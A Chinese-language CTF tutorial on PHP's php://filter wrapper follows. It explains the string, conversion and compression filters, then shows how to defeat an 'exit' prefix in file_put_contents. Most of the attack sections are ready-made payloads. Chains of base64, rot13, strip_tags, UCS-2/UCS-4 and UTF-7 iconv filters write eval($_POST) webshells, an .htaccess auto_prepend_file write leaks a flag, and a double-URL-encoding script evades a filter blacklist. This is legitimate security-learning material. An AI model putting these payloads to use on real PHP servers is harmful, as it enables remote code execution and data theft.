# php://filter

之前在学习文件包含的时候见过php://filter这个伪协议,当时只知道是可以读取文件

```
php://filter/read=convert.base64-encode/resource=flag.php
```

但是,php://filter的作用远不止如此,它不仅可以结合文件包含,还可以结合反序列化漏洞和XXE达到攻击的效果

对于PHP官方手册介绍如下

> php://filter 是一种元封装器，设计用于数据流打开时的筛选过滤应用。这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()，在数据流内容读取之前没有机会应用其他过滤器。
>
> php://filter 目标使用以下的参数作为它路径的一部分。复合过滤链能够在一个路径上指定。

`php://` — 访问各个输入/输出流（I/O streams）

`php://filter`还可以作为中间流处理其他流

![image-20210908155108532](images/1.png)

`php://filter`参数

| 名字                      | 描述                                                         |
| ------------------------- | ------------------------------------------------------------ |
| resource=<要过滤的数据流> | 这个参数是必须的。它指定了你要筛选过滤的数据流               |
| read=<读链的筛选列表>     | 该参数可选。可以设定一个或多个过滤器名称，以管道符（`|`）分隔 |
| write=<写链的筛选列表>    | 该参数可选。可以设定一个或多个过滤器名称，以管道符（`|`）分隔 |
| <；两个链的筛选列表>      | 任何没有以 `read=` 或 `write=`作前缀 的筛选器列表会视情况应用于读或写链 |

测试代码:

```
<?php
    $file1 = $_GET['file1'];
    $file2 = $_GET['file2'];
    $txt = $_GET['txt'];
    echo file_get_contents($file1);
    file_put_contents($file2,$txt);
?>
```

读取文件

```
payload:
#明文读取
?file1=php://filter/resource=flag.txt

#编码读取
?file1=php://filter/read=convert.base64-encode/resource=flag.txt
```

![image-20210908163606366](images/2.png)

编码读取

![image-20210908163549018](images/3.png)

写入文件

```
payload:
#明文写入
?file2=php://filter/resource=filter.txt&txt=helloworld

#编码写入
?file2=php://filter/write=convert.base64-encode/resource=filter2.txt&txt=helloworld
```

![image-20210908164600086](images/4.png)

![image-20210908164607941](images/5.png)

# 过滤器

## 字符串过滤器

```
字符串过滤器:
1.string.rot13
2.string.toupper		//将字符转化成大写(自PHP5.0.0起)
3.string.tolower		//将字符转化成小写(自PHP5.0.0起)
4.string.strip_tags
```

### string.rot13

`string.rot13`（自 PHP 4.3.0 起）使用此过滤器等同于用 `str_rot13()`函数处理所有的流数据。

`str_rot13()`—对字符串执行ROT13转换. ROT13编码简单地使用字母表中后面第13个字母替换当前字母，同时忽略非字母表中的字符。编码和解码都使用相同的函数，传递一个编码过的字符串作为参数，将得到原始字符串。

### string.strip_tags

(PHP4, PHP5, PHP7)（自PHP 7.3.0起已弃用此功能。）

使用这个过滤器相当于和`strip_tags()`函数处理所有的流数据

可以用两种格式接收参数：一种是和 `strip_tags()`函数第二个参数相似的一个包含有标记列表的字符串，一种是一个包含有标记名的数组。

`strip_tags`会从字符串中去除 HTML 和 PHP 标记.该函数尝试返回给定的字符串`str`去除空字符、HTML 和 PHP 标记后的结果。它使用与函数`fgetss()`一样的机制去除标记。

![image-20210908171013334](images/6.png)

## 转化过滤器

```
转换过滤器:
1.convert.base64
2.convert.quoted
3.convert.iconv.*
```

![image-20210908171326276](images/7.png)

### convert.base64

这个过滤器有两种使用方式:`convert.base64-encode`和`convert.base64-decode`,效果其实就是相当于用`base64-encode()`和`base64-decode()`对流数据进行base64加密或者解密

`convert.base64-encode`支持以一个关联数组给出的参数。如果给出了 `line-length`，base64 输出将被用 `line-length`个字符为 长度而截成块。如果给出了 `line-break-chars`，每块将被用给出的字符隔开。这些参数的效果和用 [base64_encode()](https://www.php.net/manual/zh/function.base64-encode.php)再加上 [chunk_split()](https://www.php.net/manual/zh/function.chunk-split.php)相同。

### convert.quoted

仍然有两种使用方法:`convert.quoted-printable-encode`和`convert.quoted-printable-decode`

使用此过滤器的`decode`版本等同于用 `quoted_printable_decode()`函数处理所有的流数据

没有和 `convert.quoted-printable-encode`相对应的函数。 `convert.quoted-printable-encode`支持以一个关联数组给出的参数。除了支持和 `convert.base64-encode`一样的附加参数外，`convert.quoted-printable-encode`还支持布尔参数 `binary`和 `force-encode-first`。`convert.base64-decode`只支持 `line-break-chars`参数作为从编码载荷中剥离的类型提示。

### convert.iconv.*

这个过滤器需要 php 支持 `iconv`，而 iconv 是默认编译的。使用convert.iconv.*过滤器等同于用[iconv()](https://www.php.net/manual/zh/function.iconv.php)函数处理所有的流数据。

这个转换器也有两种使用方式

```
convert.iconv.<input-encoding>.<output-encoding> 

convert.iconv.<input-encoding>/<output-encoding>
```

iconv() :字符串按要求的字符编码来转换

![image-20210908234337760](images/8.png)

支持的编码:

```
UCS-4*
UCS-4BE
UCS-4LE*
UCS-2
UCS-2BE
UCS-2LE
UTF-32*
UTF-32BE*
UTF-32LE*
UTF-16*
UTF-16BE*
UTF-16LE*
UTF-7
UTF7-IMAP
UTF-8*
ASCII*
```

## 压缩过滤器

虽然 [压缩封装协议](https://www.php.net/manual/zh/wrappers.compression.php) 提供了在本地文件系统中 创建 gzip 和 bz2 兼容文件的方法，但不代表可以在网络的流中提供通用压缩的意思，也不代表可以将一个非压缩的流转换成一个压缩流。对此，压缩过滤器可以在任何时候应用于任何流资源。

```
Note: 压缩过滤器 不产生命令行工具如 gzip的头和尾信息。只是压缩和解压数据流中的有效载荷部分

zlib. 压缩过滤器自 PHP 版本 5.1.0起可用，在激活 zlib的前提下。也可以通过安装来自 » PECL的 » zlib_filter包作为一个后门在 5.0.x版中使用。此过滤器在 PHP 4 中 不可用*。

bzip2. 压缩过滤器自 PHP 版本 5.1.0起可用，在激活 bz2支持的前提下。也可以通过安装来自 » PECL的 » bz2_filter包作为一个后门在 5.0.x版中使用。此过滤器在 PHP 4 中 不可用*。
```

详情参照官方文档:https://www.php.net/manual/zh/filters.compression.php

## 加密压缩器

`mcrypt.*`和 `mdecrypt.*`使用 libmcrypt 提供了对称的加密和解密。这两组过滤器都支持 [mcrypt 扩展库](https://www.php.net/manual/zh/ref.mcrypt.php)中相同的算法，格式为 mcrypt.ciphername，其中 `ciphername`是密码的名字，将被传递给 [mcrypt_module_open()](https://www.php.net/manual/zh/function.mcrypt-module-open.php)。有以下五个过滤器参数可用：

![image-20210908235211632](images/9.png)

详情参照文档:https://www.php.net/manual/zh/filters.encryption.php

# 绕过死亡exit

在了解了php://filter封装器后就进入到正题了,在文件包含的用php://filter读取源码的操作已经见怪不怪了,这里就不再赘述,只是想提到一个绕过waf的payload:

在文件包含漏洞中我们的payload一般为:

```
?file=php://filter/read=convert.base-encode/resource=index.php
```

但是下面这个payload和上述效果是一样的:

```
?file=php://filter/convert.base-encode/resource=index.php
```

这个在绕过一些waf的时候可能会用到

## bypass不同变量

测试代码

```
<?php
$filename=$_GET['filename'];
$content=$_GET['content'];
file_put_contents($filename,"<?php exit();".$content);
```

这个目的很明显是写文件,filename是我们写入文件的名字,后面内容拼接了一个可控的$content

但是这里有一个exit()会提前结束我们的代码,即便我们写入了一句话也不能执行,所以我们需要去绕个这个死亡exit

那我们的思路应该是想办法将前面的代码去抹去,用某些手段将其处理,使得php不能识别这串代码

### base64绕过

Base64编码是使用64个可打印ASCII字符（A-Z、a-z、0-9、+、/）将任意字节序列数据编码成ASCII字符串，另有"="符号用作后缀用途。

base64索引表如下

![image-20210909212605109](images/10.png)

在base64中支持的64个字符如上,在base64中除了这64个字符,在遇到其他字符的时候,将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码

另外base64算法解码的时候是4个byte一组

我们最后是想让`<?php exit();`这段代码失效,除去`<,?,(),;`等不合法代码,还剩下phpexit这7个字符

因为base64解码的时候是4个byte一组,我们应该再构造一个字符,让phpexit加上我们自己添加的字符去进行base64解码,当然我们希望写入的php代码先base64编码,最后解码的时候就会被转化成php代码被执行

这里`$content=aPD9waHAgQGV2YWwoJF9QT1NUWzFdKTs/Pg==`

然后最后的文件内容应该是`phpexitaPD9waHAgQGV2YWwoJF9QT1NUWzFdKTs/Pg==`

丢进base64解码可以看到

![image-20210909213554826](images/11.png)

解码后的内容就是我们需要执行的php代码

最后的payload

```
?filename=php://filter/write=convert.base64-decode/resource=shell.php&content=aPD9waHAgQGV2YWwoJF9QT1NUWzFdKTs/Pg==
```

![image-20210909213906950](images/12.png)

这里就可以成功连接我们的一句话木马了

### rot13绕过

rot13的编码特性:

`str_rot13`—对字符串执行`ROT13`转换. `ROT13`编码简单地使用字母表中后面第`13`个字母替换当前字母，同时忽略非字母表中的字符。编码和解码都使用相同的函数，传递一个编码过的字符串作为参数，将得到原始字符串。

把`<?php exit();?>`进行rot13编码后变成了`<?cuc rkvg();?>`这样exit就失去了本身的作用

rot13的编码解码都使用了相同的函数,`string.rot13`的特性是编码和解码都是自身完成,当我们传递一个编码后的字符串作为参数的时候就会得到原始字符串

不过这种利用手法的前提是PHP不开启`short_open_tag`

在php的官方文档中说的`short_open_tag`默认是开启的,但是在php-ini中却是被注释掉的,把前面分号去掉

payload:

```
?filename=php://filter/write=string.rot13/resource=dawntown.php&content=?><?cuc @riny($_CBFG[1]);?>
```

写入后的内容

![image-20210909231459019](images/13.png)

用蚁剑连接一下

![image-20210909231418024](images/14.png)

其实我试了一下,在short_open_tag被注释掉的情况下蚁剑连接仍然可以成功

### string.strip_tags绕过

`string.strip_tags`过滤器可以去除字符串中的php和html标记,相当于用`strip_tags()`函数去处理字符串

来观察一下处理后的效果

![image-20210910184622241](images/15.png)

它使用与函数`fgetss()`一样的机制去除标记。可以看到我们的php代码已经被完全去除了

但是我们要去写入webshell,但是这样我们的webshell不是也会被去除了？

之前提到过,在php://filter中我们可以搭配多种过滤器一起使用,中间用`|`连接,可以搭配convert.base64来写入webshell了,这样我们就可以不用再去数前面有多少字符了,当前面的字符过多的时候这样就会很方便

就分为以下三个步骤

```
base64编码webshell		//以免受到string.strip_tags的影响

调用strig.strip_tags过滤器		//去除<?php exit();?>

调用convert.base64-decode过滤器		//对webshell进行解码写入
```

于是payload如下

```
?filename=php://filter/write=string.strip_tags|convert.base64-decode/resource=webshell.php&content=?>PD9waHAgQGV2YWwoJF9QT1NUWzFdKTs/Pg==
```

这里要闭合一下前面的php标签,不然我们的webshell也会被去除

![image-20210910190325361](images/16.png)

### .htaccess的预包含处理

`php.ini`中有两项：

```
auto_prepend_file 在页面顶部加载文件
auto_append_file 在页面底部加载文件
```

使用这种方法,可以在页面不做任何改变的情况下,在页面顶部或者底部包含文件

例如修改php-ini里面的`auto_prepend_file="/flag"`,那么在所有页面的顶部都会包含flag这个文件

当然,我们不需要再所有页面全部包含这个文件,况且我们做题的时候也无法修改php-ini

在需要顶部或底部加载文件的文件夹中加入`.htaccess`文件，内容如下：

`php_value auto_prepend_file "/flag.php"`
`php_value auto_append_file "/flag.php"`

这样在页面顶部或者底部就可以去自动包含flag.php这个文件

```
payload:
?filename=php://filter/write=string.strip_tags/resource=.htaccess&content=?>php_value auto_prepend_file "/flag"
```

搭配string.strip_tags过滤器,再闭合前面的php标签,这样去去除`.htaccess`中的php代码,绕过了前面的死亡exit,并且自动包含了根目录下面的flag文件

再访问一下x.php

![image-20210910193723547](images/17.png)

可以看到这个文件的顶部已经包含了这个文件

不仅如此,我htaccess所在文件夹的文件顶部都出现了flag文件内容

![image-20210910193820486](images/18.png)

## bypass相同变量

测试代码

```
<?php
$content = $_GET[content];
file_put_contents($content,'<?php exit();'.$content);
```

相对于不同变量分别控制,这种相同变量的难度明显要大一些,你不仅要想办法得到一个文件名,还要写入内容并且去除exit

不过总的思路仍然是清晰的,要想办法去去除这个死亡exit,然后去写入webshell

### base64绕过

首先能想到的可以就是将进行编码的base64作为文件名来进行绕过,可以先试一试

```
php://filter/write=convert.base64-decode/resource=PD9waHAgcGhwaW5mbygpOz8+.php
```

这样我们写入的文件名就是`PD9waHAgcGhwaW5mbygpOz8+.php`

文件内容是`<?php exit();?php://filter/write=convert.base64-decode/resource=PD9waHAgcGhwaW5mbygpOz8+.php`,再补齐一下字符数![image-20210910200528014](images/19.png)

可以看到我写入的是一个空文件

这是为什么呢,可能熟悉base64编码的人就会知道,在base64中,=意味着结束,在=后面不允许有任何字符

当对`<?php exit();?php://filter/write=convert.base64-decode/resource=PD9waHAgcGhwaW5mbygpOz8+.php`这串代码进行base64解码的时候,匹配到了一个=号,这会使base64-decode报错

那怎样去绕过这个等号呢

在前面说到过用string.strip_tag过滤器可以去除php标签

那不就可以这样

```
?content=php://filter/write=string.strip_tags|convert.base64-decode/resource=?>PD9waHAgcGhwaW5mbygpOz8%2b.php

%2b是+的url编码,不然+会被当做空格处理
```

这样虽然可以生成文件,但是文件名是有问题的,我们可以用伪目录的方式去将`?>PD9waHAgcGhwaW5mbygpOz8%2b`伪装成一个目录

```
?content=php://filter/write=string.strip_tags|convert.base64-decode/resource=?>PD9waHAgcGhwaW5mbygpOz8%2b/../shell.php
```

这样`?>PD9waHAgcGhwaW5mbygpOz8%2b`会被当做一个目录,再../跳回当前目录写入shell.php

记住一定要加上前面的?>闭合php标签,不然我们写入的shell也会被string.strip_tags去除

有一个缺点就是这种利用手法在windows下利用不成功，因为文件名里面的`? >`等这些是特殊字符会导致文件的创建失败,以及对于这种问题的解决方法：使用`convert.iconv.utf-8.utf-7|convert.base64-decode`进行绕过

### rot13绕过

并不是所有的编码都会受限于'='

这里直接用rot13

```
?content=php://filter/write=string.rot13|<?cuc cucvasb();?>|/resource=shell.php

?content=php://filter/write=string.rot13/resource=<?cuc cucvasb();?>/../shell.php
```

写入的shell.php

![image-20210911152248854](images/20.png)

### convert.iconv.*

这个转化器起到的效果和base64有点相似,都是先编码再解码，然后在过程中去掉死亡代码

#### ucs-2

通过UCS-2方式，对目标字符串进行2位一反转（这里的2LE和2BE可以看作是小端和大端的列子），也就是说构造的恶意代码需要是UCS-2中2的倍数，不然不能进行正常反转（多余不满足的字符串会被截断），那我们就可以利用这种过滤器进行编码转换绕过了

```
echo iconv("UCS-2LE","UCS-2BE",'<?php @eval($_POST[ab]);?>');
```


payload:

```
?content=php://filter/convert.iconv.UCS-2LE.UCS-2BE|?<hp pe@av(l_$OPTSa[]b;)>?/resource=shell.php
```

写入的文件

![image-20210911153731088](images/21.png)

#### usc-4

通过UCS-4方式，对目标字符串进行4位一反转（这里的4LE和4BE可以看作是小端和大端的列子），也就是说构造的恶意代码需要是UCS-4中4的倍数，不然不能进行正常反转（多余不满足的字符串会被截断），那我们就可以利用这种过滤器进行编码转换绕过了.

```
<?php
echo iconv("UCS-4LE","UCS-4BE",'<?php @eval($_POST[abcd]);?>');
```

```
28字符 <?php @eval($_POST[abcd]);?> 转为 hp?<e@ p(lavOP_$a[TS]dcb>?;)
```

payload:

```
?content=php://filter/convert.iconv.UCS-4LE.UCS-4BE|hp?<e@ p(lavOP_$a[TS]dcb>?;)/resource=shell.php
```

写入内容

![image-20210911154156137](images/22.png)

#### utf8-utf7

在UTF-8,UTF-7的作用下convert.iconv 这个过滤器可以把等号转化成+AD0-

![image-20210911154459800](images/23.png)

而+AD0-这个字符串可以被base64解码,这样就可以解决base64中等号的问题了、

```
payload:
?content=php://filter/write=PD9waHAgcGhwaW5mbygpOz8+|convert.iconv.utf-8.utf-7|convert.base64-decode/resource=webshell.php
注意这里base64要满足4个字节一组,不要去影响shell的base64编码
```

写入的文件

![image-20210911155616531](images/24.png)



## 例题分析

### VMCTF Checkin

题目源码

```
<?php
//PHP 7.0.33 Apache/2.4.25
error_reporting(0);
$sandbox = '/var/www/html/' . md5($_SERVER['HTTP_X_REAL_IP']);
@mkdir($sandbox);
@chdir($sandbox);
highlight_file(__FILE__);
if(isset($_GET['content'])) {
    $content = $_GET['content'];
    if(preg_match('/iconv|UCS|UTF|rot|quoted|base64/i',$content))
         die('hacker');
    if(file_exists($content))
        require_once($content);
    echo $content;
    file_put_contents($content,'<?php exit();'.$content);
}
```

题目中过滤了多个过滤器,然后写文件的时候用的是相同变量

不过我们应该要了解伪协议的机制,处理的时候会对过滤器进行一次urlencode

```
static void php_stream_apply_filter_list(php_stream *stream, char *filterlist, int read_chain, int write_chain) 
{
	char *p, *token = NULL;
	php_stream_filter *temp_filter;

	p = php_strtok_r(filterlist, "|", &token);
	while (p) {
		php_url_decode(p, strlen(p));#对过滤器进行了一次urldecode
		if (read_chain) {
			if ((temp_filter = php_stream_filter_create(p, NULL, php_stream_is_persistent(stream)))) {
				php_stream_filter_append(&stream->readfilters, temp_filter);
			} else {
				php_error_docref(NULL, E_WARNING, "Unable to create filter (%s)", p);
			}
		}
		if (write_chain) {
			if ((temp_filter = php_stream_filter_create(p, NULL, php_stream_is_persistent(stream)))) {
				php_stream_filter_append(&stream->writefilters, temp_filter);
			} else {
				php_error_docref(NULL, E_WARNING, "Unable to create filter (%s)", p);
			}
		}
		p = php_strtok_r(NULL, "|", &token);
	}
}
```

所以这里可以利用二次编码绕过

不过这里好像是吧%25ban掉了

网上给了个脚本来构造二次编码

```
<?php
$char = 'r'; #构造r的二次编码
for ($ascii1 = 0; $ascii1 < 256; $ascii1++) {
	for ($ascii2 = 0; $ascii2 < 256; $ascii2++) {
		$aaa = '%'.$ascii1.'%'.$ascii2;
		if(urldecode(urldecode($aaa)) == $char){
			echo $char.': '.$aaa;
			echo "\n";
		}
	}
}
?>
```

payload:

```
php://filter/write=string.%7%32ot13|<?cuc cucvasb();?>|/resource=shell.php
```





参考链接:

https://www.anquanke.com/post/id/202510#h3-18

https://yanmie-art.github.io/2020/09/05/%E6%8E%A2%E7%B4%A2php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E4%BB%A5%E5%8F%8A%E6%AD%BB%E4%BA%A1%E7%BB%95%E8%BF%87/

